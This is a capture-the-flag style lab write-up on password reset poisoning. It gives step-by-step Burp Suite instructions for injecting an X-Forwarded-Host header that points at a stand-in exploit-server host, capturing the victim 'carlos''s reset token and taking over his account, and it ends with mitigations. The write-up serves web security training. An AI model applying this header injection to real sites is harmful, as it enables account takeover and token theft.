# Lab: Password Reset Poisoning

## Overview
This lab is vulnerable to password reset poisoning via the X-Forwarded-Host header. By manipulating this header, an attacker can redirect password reset links to a malicious server and steal reset tokens.

## Objective
Exploit the password reset functionality to obtain Carlos's reset token, reset his password, and log in to his account.

## Tools Used
Burp Suite (Proxy, Repeater), Browser, Exploit Server

## Vulnerability Explanation
The application uses the X-Forwarded-Host header to generate password reset links. Since this header is not validated, an attacker can:

- Modify the reset link domain
- Capture the victim's reset token
- Use the token to reset the victim's password

This is known as **password reset poisoning**.

## Steps to Reproduce

1. Log in using provided credentials:
   - Username: `wiener`
   - Password: `peter`

2. Navigate to the **Forgot Password** functionality.

3. Intercept the request using Burp Suite.

4. Observe that a password reset link is sent via email containing a token.

5. Send the request to **Burp Repeater**.

6. Add the following header:

X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net


7. Modify the request:
- Change username to: `carlos`

8. Send the request.

9. Go to the **Exploit Server → Access Log**:
- Find request containing `/forgot-password`
- Copy the `temp-forgot-password-token`

10. Go to your email client:
 - Copy the legitimate password reset link

11. Replace the token in the URL with the stolen token:
 ```
 temp-forgot-password-token=STOLEN_TOKEN
 ```

12. Open the modified URL in browser.

13. Set a new password for Carlos.

14. Log in as:
 - Username: `carlos`
 - Password: *(new password)*

## Payload Used

### Header Injection

X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net


## Proof of Concept

- Manipulated password reset request using X-Forwarded-Host
- Captured victim's reset token via exploit server
- Used stolen token to reset password
- Successfully logged in as Carlos

## Impact
- Full account takeover
- Password reset mechanism compromised
- Sensitive tokens exposed to attacker

## Mitigation
- Do not trust user-controlled headers like X-Forwarded-Host
- Use a fixed domain when generating reset links
- Validate host headers on the server
- Use secure token handling and expiration

## Key Learnings
- Learned how header injection leads to account takeover
- Understood password reset poisoning attacks
- Practiced exploiting X-Forwarded-Host vulnerability
- Importance of validating headers in web applications
